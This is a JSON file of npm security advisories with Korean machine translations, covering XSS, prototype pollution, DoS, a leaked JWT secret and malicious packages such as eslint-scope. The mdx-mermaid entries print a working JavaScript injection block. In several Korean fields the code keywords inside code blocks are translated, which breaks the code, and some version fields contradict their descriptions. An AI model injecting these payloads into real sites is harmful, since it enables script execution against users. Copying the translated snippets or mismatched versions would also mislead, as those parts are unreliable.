    "descriptionKR": "### 영향\n서버 JWT 서명 비밀은 정적 자산에 포함되어 클라이언트에 제공되었습니다.\n\n이렇게 하면 Flood의 내장 인증을 우회할 수 있습니다. 인증된 사용자에 대한 Flood의 보안 제어 부족과 함께 Flood에 rTorrent의 SCGI 인터페이스(보호되지 않고 임의 코드 실행 허용)에 대한 액세스 권한과 일반적으로 파일에 대한 광범위한 권한이 부여된 경우 이 취약점의 심각도는 **심각**입니다. .\n\n### 배경\n8d11640b에서 가져온 `config.js`를 클라이언트(프론트엔드) 구성 요소에 커밋하여 `disableUsersAndAuth` 구성 변수를 가져옵니다. 이후 `config.js`의 내용은 정적 자산으로 컴파일되어 사용자에게 제공됩니다. 불행히도 `config.js`에는 `secret`도 포함되어 있습니다.\n\n침입자는 Flood의 기본 액세스 제어를 우회하기 위해 '비밀'을 사용하여 인증 토큰에 서명할 수 있습니다.\n\n### 패치\n커밋 042cb4ce는 클라이언트(프론트엔드) 구성 요소에서 `config.js` 가져오기를 제거했습니다. 또한 config.js가 클라이언트(프론트엔드) 구성 요소로 가져오는 것을 방지하기 위해 eslint 규칙이 추가되었습니다.\n\n커밋 103f53c8은 서버(백엔드)를 시작하기 전에 '비밀'이 포함되지 않도록 정적 자산을 검색하여 이러한 종류의 문제에 대한 일반적인 완화를 제공했습니다.\n\n### 해결 방법\n사용자는 Flood의 내장 인증 시스템을 사용하는 경우 업그레이드해야 합니다.\n\n관리자는 이를 지원하기 위해 최선을 다하겠지만 Flood는 사내 액세스 제어 시스템이 고위험 환경에서 단호한 공격자에 맞설 수 있다고 보장할 수 없습니다.\n\n> Flood의 사내 인증 대신 `HTTP 기본 인증` 또는 기타 강화된 인증 방법을 사용하십시오. 중복 인증을 피하기 위해 `disableUsersAndAuth`를 사용할 수 있습니다.\n\n보안 예방 조치에 대한 자세한 내용은 [wiki](https://github.com/jesec/flood/wiki)를 확인하시기 바랍니다.\n\n### 참조\n[Wiki - 보안 예방 조치](https://github.com/jesec/flood/wiki/Security-precautions)\n\n[JSON 웹 토큰 소개](https://jwt.io/introduction/)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [이슈 트래커](https://github.com/jesec/flood/issues)에서 이슈 열기\n* [jc@linux.com](mailto:jc@linux.com)으로 이메일을 보내주세요."
  },
  {
    "description": "A cross-site scripting vulnerability exists in koa-shopify-auth v3.1.61-v3.1.62 that allows an attacker to inject JS payloads into the `shop` parameter on the `/shopify/auth/enable_cookies` endpoint.",
    "identifiers": "GHSA : GHSA-jqh7-w5pr-cr56\nCVE : CVE-2020-8176",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:01:46Z",
    "publishedAt": "2021-05-17T21:01:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-8176\nhttps://github.com/Shopify/quilt/pull/1455\nhttps://hackerone.com/reports/881409\nhttps://github.com/advisories/GHSA-jqh7-w5pr-cr56",
    "name": "@shopify/koa-shopify-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.1.61, <= 3.1.62",
    "identifier": "3.1.63",
    "descriptionKR": "koa-shopify-auth v3.1.61-v3.1.62에는 공격자가 `/shopify/auth/enable_cookies` 엔드포인트의 `shop` 매개변수에 JS 페이로드를 주입할 수 있는 교차 사이트 스크립팅 취약점이 존재합니다."
  },
  {
    "description": "An XSS issue in Joplin desktop allows arbitrary code execution via a malicious HTML embed tag.",
    "identifiers": "GHSA : GHSA-cgc7-mwp4-3ccx\nCVE : CVE-2020-15930",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:02:05Z",
    "publishedAt": "2021-05-07T16:29:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-15930\nhttps://github.com/laurent22/joplin/issues/3552\nhttps://github.com/laurent22/joplin/releases/tag/v1.1.4\nhttp://packetstormsecurity.com/files/159316/Joplin-1.0.245-Cross-Site-Scripting-Code-Execution.html\nhttps://github.com/laurent22/joplin/commit/57d750bc9aeb0f98d53ed4b924458b54984c15ff\nhttps://github.com/advisories/GHSA-cgc7-mwp4-3ccx",
    "name": "joplin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.190, < 1.1.7",
    "identifier": "1.1.7",
    "descriptionKR": "Joplin 데스크톱의 XSS 문제로 인해 악성 HTML 포함 태그를 통한 임의 코드 실행이 허용됩니다."
  },
  {
    "description": "Versions of `dojo` prior to 1.2.0 are vulnerable to Cross-Site Scripting (XSS). The package fails to sanitize HTML code in user-controlled input, allowing attackers to execute arbitrary JavaScript in the victim's browser.\n\n\n## Recommendation\n\nUpgrade to version 1.2.0 or later.",
    "identifiers": "GHSA : GHSA-p82g-2xpp-m5r3\nCVE : CVE-2015-5654",
    "severity": "MODERATE",
    "updatedAt": "2023-01-06T05:01:55Z",
    "publishedAt": "2020-09-11T21:18:05Z",
    "references": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5654\nhttps://snyk.io/vuln/SNYK-JS-DOJO-174933\nhttps://www.npmjs.com/advisories/973\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-5654\nhttp://jvn.jp/en/jp/JVN13456571/index.html\nhttp://jvndb.jvn.jp/jvndb/JVNDB-2015-000153\nhttp://www-01.ibm.com/support/docview.wss?uid=swg21975256\nhttp://www.securityfocus.com/bid/77026\nhttp://www.securitytracker.com/id/1034848\nhttps://github.com/advisories/GHSA-p82g-2xpp-m5r3",
    "name": "dojo",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.0",
    "identifier": "1.9.1",
    "descriptionKR": "1.2.0 이전의 'dojo' 버전은 XSS(Cross-Site Scripting)에 취약합니다. 이 패키지는 사용자 제어 입력에서 HTML 코드를 삭제하지 못하여 공격자가 피해자의 브라우저에서 임의의 JavaScript를 실행할 수 있습니다.\n\n\n## 추천\n\n버전 1.2.0 이상으로 업그레이드하십시오."
  },
  {
    "description": "This affects the package jszip before 3.7.0. Crafting a new zip file with filenames set to Object prototype values (e.g __proto__, toString, etc) results in a returned object with a modified prototype instance.",
    "identifiers": "GHSA : GHSA-jg8v-48h5-wgxg\nCVE : CVE-2021-23413",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:04:38Z",
    "publishedAt": "2021-08-10T16:02:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23413\nhttps://github.com/Stuk/jszip/pull/766\nhttps://github.com/Stuk/jszip/commit/22357494f424178cb416cdb7d93b26dd4f824b36\nhttps://github.com/Stuk/jszip/blob/master/lib/object.js%23L88\nhttps://snyk.io/vuln/SNYK-JS-JSZIP-1251497\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1251499\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1251498\nhttps://github.com/advisories/GHSA-jg8v-48h5-wgxg",
    "name": "jszip",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.7.0",
    "identifier": "2.7.0",
    "descriptionKR": "이것은 3.7.0 이전 패키지 jszip에 영향을 미칩니다. 파일 이름이 Object 프로토타입 값(예: __proto__, toString 등)으로 설정된 새 zip 파일을 만들면 프로토타입 인스턴스가 수정된 반환된 객체가 생성됩니다."
  },
  {
    "description": "This affects the package jszip before 3.7.0. Crafting a new zip file with filenames set to Object prototype values (e.g __proto__, toString, etc) results in a returned object with a modified prototype instance.",
    "identifiers": "GHSA : GHSA-jg8v-48h5-wgxg\nCVE : CVE-2021-23413",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:04:38Z",
    "publishedAt": "2021-08-10T16:02:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23413\nhttps://github.com/Stuk/jszip/pull/766\nhttps://github.com/Stuk/jszip/commit/22357494f424178cb416cdb7d93b26dd4f824b36\nhttps://github.com/Stuk/jszip/blob/master/lib/object.js%23L88\nhttps://snyk.io/vuln/SNYK-JS-JSZIP-1251497\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1251499\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1251498\nhttps://github.com/advisories/GHSA-jg8v-48h5-wgxg",
    "name": "jszip",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.7.0",
    "identifier": "3.7.0",
    "descriptionKR": "이것은 3.7.0 이전 패키지 jszip에 영향을 미칩니다. 파일 이름이 Object 프로토타입 값(예: __proto__, toString 등)으로 설정된 새 zip 파일을 만들면 프로토타입 인스턴스가 수정된 반환된 객체가 생성됩니다."
  },
  {
    "description": "eivindfjeldstad-dot below 1.0.3 is vulnerable to Prototype Pollution.The function 'set' could be tricked into adding or modifying properties of 'Object.prototype' using a '__proto__' payload.",
    "identifiers": "GHSA : GHSA-wfwq-xc57-fq7v\nCVE : CVE-2020-7639",
    "severity": "MODERATE",
    "updatedAt": "2023-07-13T17:59:32Z",
    "publishedAt": "2021-05-25T15:59:14Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7639\nhttps://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b\nhttps://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435\nhttps://github.com/advisories/GHSA-wfwq-xc57-fq7v",
    "name": "@eivifj/dot",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.3",
    "identifier": "1.0.3",
    "descriptionKR": "1.0.3 미만의 evindfjeldstad-dot는 Prototype Pollution에 취약합니다. '__proto__' 페이로드를 사용하여 'Object.prototype'의 속성을 추가하거나 수정하도록 'set' 함수를 속일 수 있습니다."
  },
  {
    "description": "Cross-site scripting (XSS) vulnerability in the default content option in jquery.ui.tooltip.js in the Tooltip widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title attribute, which is not properly handled in the autocomplete combo box demo.",
    "identifiers": "GHSA : GHSA-qqxp-xp9v-vvx6\nCVE : CVE-2012-6662",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:07:35Z",
    "publishedAt": "2017-10-24T18:33:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2012-6662\nhttps://github.com/jquery/jquery/issues/2432\nhttps://github.com/jquery/jquery-ui/commit/5fee6fd5000072ff32f2d65b6451f39af9e0e39e\nhttps://github.com/jquery/jquery-ui/commit/f2854408cce7e4b7fc6bf8676761904af9c96bde\nhttps://exchange.xforce.ibmcloud.com/vulnerabilities/98697\nhttps://github.com/advisories/GHSA-qqxp-xp9v-vvx6\nhttp://bugs.jqueryui.com/ticket/8859\nhttp://bugs.jqueryui.com/ticket/8861\nhttp://rhn.redhat.com/errata/RHSA-2015-0442.html\nhttp://rhn.redhat.com/errata/RHSA-2015-1462.html\nhttp://seclists.org/oss-sec/2014/q4/613\nhttp://seclists.org/oss-sec/2014/q4/616\nhttp://www.securityfocus.com/bid/71107",
    "name": "jquery-ui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.10.0",
    "identifier": "1.10.0",
    "descriptionKR": "jQuery UI 1.10.0 이전의 도구 설명 위젯에 있는 jquery.ui.tooltip.js의 기본 콘텐츠 옵션에 있는 XSS(교차 사이트 스크립팅) 취약성은 원격 공격자가 제목 속성을 통해 임의의 웹 스크립트 또는 HTML을 삽입할 수 있도록 허용합니다. 자동 완성 콤보 상자 데모에서 제대로 처리됩니다."
  },
  {
    "description": "The NPM package `flatmap-stream` is considered malicious.  A malicious actor added this package as a dependency to the NPM `event-stream` package in version `3.3.6`.  Users of `event-stream` are encouraged to downgrade to the last non-malicious version, `3.3.4`, or upgrade to the latest  4.x version. \n\nUsers of `flatmap-stream` are encouraged to remove the dependency entirely.\n",
    "identifiers": "GHSA : GHSA-mh6f-8j2x-4483",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-12T05:08:40Z",
    "publishedAt": "2018-11-26T23:58:21Z",
    "references": "https://github.com/dominictarr/event-stream/issues/116\nhttps://github.com/advisories/GHSA-mh6f-8j2x-4483",
    "name": "flatmap-stream",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0",
    "descriptionKR": "NPM 패키지 `flatmap-stream`은 악성으로 간주됩니다. 악의적인 행위자는 이 패키지를 버전 `3.3.6`에서 NPM `event-stream` 패키지에 대한 종속성으로 추가했습니다. `event-stream` 사용자는 마지막 비악성 버전인 `3.3.4`로 다운그레이드하거나 최신 4.x 버전으로 업그레이드하는 것이 좋습니다.\n\n`flatmap-stream` 사용자는 종속성을 완전히 제거하는 것이 좋습니다."
  },
  {
    "description": "Version 3.7.2 of `eslint-scope` was published without authorization and was found to contain malicious code. This code would read the users `.npmrc` file and send any found authentication tokens to 2 remote servers.\n\n\n## Recommendation\n\nThe best course of action if you found this package installed in your environment is to revoke all your npm tokens. You can find instructions on how to do that here. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens",
    "identifiers": "GHSA : GHSA-hxxf-q3w9-4xgw",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T22:06:02Z",
    "publishedAt": "2018-07-12T19:52:02Z",
    "references": "https://github.com/eslint/eslint-scope/issues/39\nhttps://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes\nhttps://github.com/advisories/GHSA-hxxf-q3w9-4xgw\nhttps://www.npmjs.com/advisories/673\nhttps://snyk.io/vuln/SNYK-JS-ESLINTSCOPE-11120",
    "name": "eslint-config-eslint",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 5.0.2",
    "identifier": "6.0.0",
    "descriptionKR": "`eslint-scope`의 버전 3.7.2가 무단으로 게시되었으며 악성 코드가 포함되어 있는 것으로 밝혀졌습니다. 이 코드는 사용자 `.npmrc` 파일을 읽고 발견된 인증 토큰을 2개의 원격 서버로 보냅니다.\n\n\n## 추천\n\n환경에 이 패키지가 설치되어 있는 경우 가장 좋은 조치는 모든 npm 토큰을 취소하는 것입니다. 여기에서 방법에 대한 지침을 찾을 수 있습니다. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens"
  },
  {
    "description": "### Impact\n\nUpgradeable contracts using `UUPSUpgradeable` may be vulnerable to an attack affecting uninitialized implementation contracts. We will update this advisory with more information soon.\n\n### Patches\n\nA fix is included in version 4.3.2 of `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable`.\n\n### Workarounds\n\nInitialize implementation contracts using `UUPSUpgradeable` by invoking the initializer function (usually called `initialize`). An example is provided [in the forum](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301).\n\n### References\n\n[Post-mortem](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance executing the mitigation, email us at security@openzeppelin.com.",
    "identifiers": "GHSA : GHSA-5vp3-v4hc-gx76\nCVE : CVE-2021-41264",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-28T05:02:26Z",
    "publishedAt": "2021-09-15T20:23:17Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-5vp3-v4hc-gx76\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-41264\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/024cc50df478d2e8f78539819749e94d6df60592\nhttps://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301\nhttps://github.com/advisories/GHSA-5vp3-v4hc-gx76",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.3.2",
    "identifier": "4.3.2",
    "descriptionKR": "### 영향\n\n'UUPSUpgradeable'을 사용하는 업그레이드 가능한 계약은 초기화되지 않은 구현 계약에 영향을 미치는 공격에 취약할 수 있습니다. 곧 더 많은 정보로 이 권고를 업데이트할 예정입니다.\n\n### 패치\n\n수정 사항은 `@openzeppelin/contracts` 및 `@openzeppelin/contracts-upgradeable` 버전 4.3.2에 포함되어 있습니다.\n\n### 해결 방법\n\n초기화 함수(일반적으로 '초기화'라고 함)를 호출하여 'UUPSUpgradeable'을 사용하여 구현 계약을 초기화합니다. 예는 [포럼](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301)에서 제공됩니다.\n\n### 참조\n\n[사후 분석](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 완화 실행에 도움이 필요한 경우 security@openzeppelin.com으로 이메일을 보내주십시오."
  },
  {
    "description": "The package node-opcua before 2.74.0 are vulnerable to Denial of Service (DoS) when bypassing the limitations for excessive memory consumption by sending multiple `CloseSession` requests with the `deleteSubscription` parameter equal to `False`.",
    "identifiers": "GHSA : GHSA-vh4f-fgpp-x8x2\nCVE : CVE-2022-24375",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:01:38Z",
    "publishedAt": "2022-08-25T00:00:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24375\nhttps://github.com/node-opcua/node-opcua/pull/1182\nhttps://github.com/node-opcua/node-opcua/commit/3fd46ec156e7718a506be41f3916310b6bdd0407\nhttps://github.com/node-opcua/node-opcua/commit/7b5044b3f5866fbedc3efabd05e407352c07bd2f\nhttps://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988725\nhttps://github.com/advisories/GHSA-vh4f-fgpp-x8x2",
    "name": "node-opcua",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.74.0",
    "identifier": "2.74.0",
    "descriptionKR": "2.74.0 이전 패키지 node-opcua는 `deleteSubscription` 매개변수가 `False`인 여러 `CloseSession` 요청을 전송하여 과도한 메모리 소비 제한을 우회할 때 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "The package node-opcua before 2.74.0 are vulnerable to Denial of Service (DoS) by sending a specifically crafted OPC UA message with a special OPC UA NodeID, when the requested memory allocation exceeds the v8’s memory limit.",
    "identifiers": "GHSA : GHSA-qpgc-xh7j-52q8\nCVE : CVE-2022-25231",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:01:38Z",
    "publishedAt": "2022-08-24T00:00:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25231\nhttps://github.com/node-opcua/node-opcua/pull/1182\nhttps://github.com/node-opcua/node-opcua/commit/7b5044b3f5866fbedc3efabd05e407352c07bd2f\nhttps://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988724\nhttps://github.com/advisories/GHSA-qpgc-xh7j-52q8",
    "name": "node-opcua",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.74.0",
    "identifier": "2.74.0",
    "descriptionKR": "2.74.0 이전 패키지 node-opcua는 요청된 메모리 할당이 v8의 메모리 제한을 초과할 때 특수 OPC UA NodeID와 함께 특별히 제작된 OPC UA 메시지를 전송하여 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "### Impact\n\nArbitary javascript injection\n\nModify any mermaid code blocks with the following code and the code inside will execute when the component is loaded by MDXjs\n\n```\n` + (function () {\n  // Put Javascript code here\n  return ''\n}()) + `\n```\n\nThe block below shows a valid mermaid code block\n\n````md\n```mermaid\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\nThe same block but with the exploit added\n\n````md\n```mermaid\n` + (function () {\n  alert('vulnerable')\n  return ''\n}()) + `\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\n### Patches\n1.3.0 and 2.0.0-rc2\n\n### Workarounds\nNone known",
    "identifiers": "GHSA : GHSA-rvgm-35jw-q628\nCVE : CVE-2022-36036",
    "severity": "LOW",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-08-31T22:26:11Z",
    "references": "https://github.com/sjwall/mdx-mermaid/security/advisories/GHSA-rvgm-35jw-q628\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36036\nhttps://github.com/sjwall/mdx-mermaid/commit/f2b99386660fd13316823529c3f1314ebbcdfd2a\nhttps://github.com/advisories/GHSA-rvgm-35jw-q628",
    "name": "mdx-mermaid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.0.0-rc1",
    "identifier": "2.0.0-rc2",
    "descriptionKR": "### 영향\n\n임의 자바스크립트 주입\n\n다음 코드를 사용하여 인어 코드 블록을 수정하면 MDXjs에서 구성 요소를 로드할 때 내부 코드가 실행됩니다.\n\n```\n` + (함수() {\n  // 자바스크립트 코드를 여기에 입력\n  반품 ''\n}()) + `\n```\n\n아래 블록은 유효한 인어 코드 블록을 보여줍니다.\n\n````md\n```인어\n그래프 TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    씨-->디;\n```\n````\n\n익스플로잇이 추가된 동일한 블록\n\n````md\n```인어\n` + (함수() {\n  경고('취약')\n  반품 ''\n}()) + `\n그래프 TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    씨-->디;\n```\n````\n\n### 패치\n1.3.0 및 2.0.0-rc2\n\n### 해결 방법\n알려진 바 없음"
  },
  {
    "description": "### Impact\n\nArbitary javascript injection\n\nModify any mermaid code blocks with the following code and the code inside will execute when the component is loaded by MDXjs\n\n```\n` + (function () {\n  // Put Javascript code here\n  return ''\n}()) + `\n```\n\nThe block below shows a valid mermaid code block\n\n````md\n```mermaid\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\nThe same block but with the exploit added\n\n````md\n```mermaid\n` + (function () {\n  alert('vulnerable')\n  return ''\n}()) + `\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\n### Patches\n1.3.0 and 2.0.0-rc2\n\n### Workarounds\nNone known",
    "identifiers": "GHSA : GHSA-rvgm-35jw-q628\nCVE : CVE-2022-36036",
    "severity": "LOW",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-08-31T22:26:11Z",
    "references": "https://github.com/sjwall/mdx-mermaid/security/advisories/GHSA-rvgm-35jw-q628\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36036\nhttps://github.com/sjwall/mdx-mermaid/commit/f2b99386660fd13316823529c3f1314ebbcdfd2a\nhttps://github.com/advisories/GHSA-rvgm-35jw-q628",
    "name": "mdx-mermaid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.0",
    "identifier": "1.3.0",
    "descriptionKR": "### 영향\n\n임의 자바스크립트 주입\n\n다음 코드를 사용하여 인어 코드 블록을 수정하면 MDXjs에서 구성 요소를 로드할 때 내부 코드가 실행됩니다.\n\n```\n` + (함수() {\n  // 자바스크립트 코드를 여기에 입력\n  반품 ''\n}()) + `\n```\n\n아래 블록은 유효한 인어 코드 블록을 보여줍니다.\n\n````md\n```인어\n그래프 TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    씨-->디;\n```\n````\n\n익스플로잇이 추가된 동일한 블록\n\n````md\n```인어\n` + (함수() {\n  경고('취약')\n  반품 ''\n}()) + `\n그래프 TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    씨-->디;\n```\n````\n\n### 패치\n1.3.0 및 2.0.0-rc2\n\n### 해결 방법\n알려진 바 없음"
  },
  {
    "description": "### Impact\nPossible ReDoS with lib input of `{{` and with many repetitions of `{{|`\n\n### Patches\nPatched in all versions above `0.2.5`\n\n### Workarounds\nNo known work arounds.\n\n### References\n- OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n- Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n- Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n- James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](http://www.cs.bham.ac.uk/~hxt/research/reg-exp-sec.pdf).\n- Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n- Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\n\n",
    "identifiers": "GHSA : GHSA-vqc4-v8hc-h2jg\nCVE : CVE-2022-36034",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:05:39Z",
    "publishedAt": "2022-08-31T22:23:39Z",
    "references": "https://github.com/cainthebest/nitrado.js/security/advisories/GHSA-vqc4-v8hc-h2jg\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36034\nhttps://github.com/cainthebest/nitrado.js/blob/v0.2.5/CHANGELOG.md\nhttps://github.com/advisories/GHSA-vqc4-v8hc-h2jg",
    "name": "nitrado.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.5",
    "identifier": "0.2.5",
    "descriptionKR": "### 영향\n`{{`의 lib 입력과 `{{|`의 많은 반복으로 가능한 ReDoS\n\n### 패치\n`0.2.5` 이상의 모든 버전에서 패치됨\n\n### 해결 방법\n알려진 해결 방법이 없습니다.\n\n### 참조\n- OWASP: [정규식 서비스 거부 - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n- 위키백과: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n- Wikipedia: [시간 복잡도](https://en.wikipedia.org/wiki/Time_complexity).\n- James Kirrage, Asiri Rathnayake, Hayo Thielecke: [정규식 서비스 거부 공격에 대한 정적 분석](http://www.cs.bham.ac.uk/~hxt/research/reg-exp-sec.pdf ).\n- 일반적인 약점 목록: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n- 일반적인 약점 목록: [CWE-400](https://cwe.mitre.org/data/definitions/400.html)."
  },
  {
    "description": "### Impact\nUsers using any captcha providers\n\n### Patches\n>0.1.0\n\n### References\n[Issue](https://github.com/excl-networks/strapi-plugin-ezforms/issues/15)\n",
    "identifiers": "GHSA : GHSA-8mgq-6r2q-82w9",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:06:35Z",
    "publishedAt": "2022-08-30T20:54:12Z",
    "references": "https://github.com/excl-networks/strapi-plugin-ezforms/security/advisories/GHSA-8mgq-6r2q-82w9\nhttps://github.com/excl-networks/strapi-plugin-ezforms/issues/15\nhttps://github.com/excl-networks/strapi-plugin-ezforms/commit/a8372190b7122e5dda32d5b71b2513fd5352656a\nhttps://github.com/advisories/GHSA-8mgq-6r2q-82w9",
    "name": "strapi-plugin-ezforms",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.1.0",
    "identifier": "0.1.0",
    "descriptionKR": "### 영향\n보안 문자 제공자를 사용하는 사용자\n\n### 패치\n>0.1.0\n\n### 참조\n[이슈](https://github.com/excl-networks/strapi-plugin-ezforms/issues/15)"
  },
  {
    "description": "The package node-opcua before 2.74.0 are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions. An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.",
    "identifiers": "GHSA : GHSA-4hr4-pjjh-2q2w\nCVE : CVE-2022-21208",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:01:46Z",
    "publishedAt": "2022-08-24T00:00:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21208\nhttps://github.com/node-opcua/node-opcua/pull/1149\nhttps://github.com/node-opcua/node-opcua/commit/33ca3bab4ab781392a2f8d8f5a14de9a0aa0e410\nhttps://github.com/node-opcua/node-opcua/commit/dbcb5d5191118c22ee9c89332a94b94e6553d76b\nhttps://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988723\nhttps://github.com/advisories/GHSA-4hr4-pjjh-2q2w",
    "name": "node-opcua",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.74.0",
    "identifier": "2.74.0",
    "descriptionKR": "2.74.0 이전 패키지 node-opcua는 단일 세션당 또는 모든 동시 세션에 대한 총 수신된 청크 수에 대한 제한이 없기 때문에 서비스 거부(DoS)에 취약합니다. 공격자는 최종 종료 청크를 전송하지 않고 거대한 청크(예: 각각 2GB)를 무제한으로 전송하여 이 취약점을 악용할 수 있습니다."
  },
  {
    "description": "### Impact\n\nWhen specific requests are made to the Next.js server it can cause an `unhandledRejection` in the server which can crash the process to exit in specific Node.js versions with strict `unhandledRejection` handling. \n\n- Affected: All of the following must be true to be affected by this CVE\n  - Node.js version above v15.0.0 being used with strict `unhandledRejection` exiting\n  - Next.js version v12.2.3\n  - Using next start or a [custom server](https://nextjs.org/docs/advanced-features/custom-server)\n \n- Not affected: Deployments on Vercel ([vercel.com](https://vercel.com/)) are not affected along with similar environments where `next-server` isn't being shared across requests.\n\n### Patches\nhttps://github.com/vercel/next.js/releases/tag/v12.2.4\n",
    "identifiers": "GHSA : GHSA-wff4-fpwg-qqv3\nCVE : CVE-2022-36046",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-08-30T20:38:34Z",
    "references": "https://github.com/vercel/next.js/security/advisories/GHSA-wff4-fpwg-qqv3\nhttps://github.com/vercel/next.js/releases/tag/v12.2.4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36046\nhttps://github.com/advisories/GHSA-wff4-fpwg-qqv3",
    "name": "next",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 12.2.3",
    "identifier": "12.2.4",
